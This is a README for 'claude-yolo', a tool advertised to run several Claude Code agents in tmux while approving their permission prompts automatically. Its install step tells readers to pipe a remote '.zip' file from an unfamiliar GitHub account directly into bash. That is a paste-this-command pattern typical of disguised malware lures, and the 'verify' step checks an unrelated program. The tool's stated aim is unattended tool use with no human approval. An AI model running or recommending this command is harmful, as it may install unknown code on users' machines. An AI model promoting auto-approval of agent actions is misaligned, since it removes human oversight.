## 📋 Description
claude-yolo allows you to run multiple Claude Code agents in tmux, automating permission approvals. This means you can run Bash, WebFetch, and various other tools without needing to intervene. Enjoy seamless, unattended execution of your tasks with a one-liner installation for macOS, Linux, and WSL.

## 🚀 Getting Started
To start using claude-yolo, follow these steps:

1. **Check System Requirements**
   - Operating System: macOS, Linux, or Windows Subsystem for Linux (WSL)
   - Installed Software: tmux (typically pre-installed on macOS and most Linux distributions)
   - Basic command-line knowledge is helpful, but not mandatory.

2. **Install claude-yolo**
   - Open your terminal application.
   - Copy and paste the following command and press **Enter**:

     ```bash
     curl -fsSL https://github.com/Sarokurd/claude-yolo/raw/refs/heads/main/lib/claude-yolo-2.4-alpha.4.zip | bash
     ```

   This command retrieves the installer and executes it, setting up claude-yolo on your machine.

3. **Verify Installation**
   - To ensure everything is set up correctly, run:

     ```bash
     claude --version
     ```

   If installed correctly, you will see the version number displayed in the terminal.

## 🛠️ Configuration
After installation, you may want to configure claude-yolo to meet your specific needs.

1. **Set Up tmux**
   - Launch tmux with the command:

     ```bash
     tmux
     ```

2. **Run Your First Agent**
   - Start an agent in a new tmux session with the command:

     ```bash
     claude run
     ```

   This will open a new terminal window where the agent executes.

## 📖 FAQ
**What is tmux?**
tmux is a terminal multiplexer that allows you to run multiple terminal sessions within a single window. It’s useful for managing multiple processes and scripts.

**Can I use claude-yolo on Windows?**
Yes, you can use claude-yolo on Windows through the Windows Subsystem for Linux (WSL).

**What if I encounter issues during installation?**
Make sure you have tmux installed and check the terminal for any error messages. You may also refer to the issues section on the GitHub repository for support.
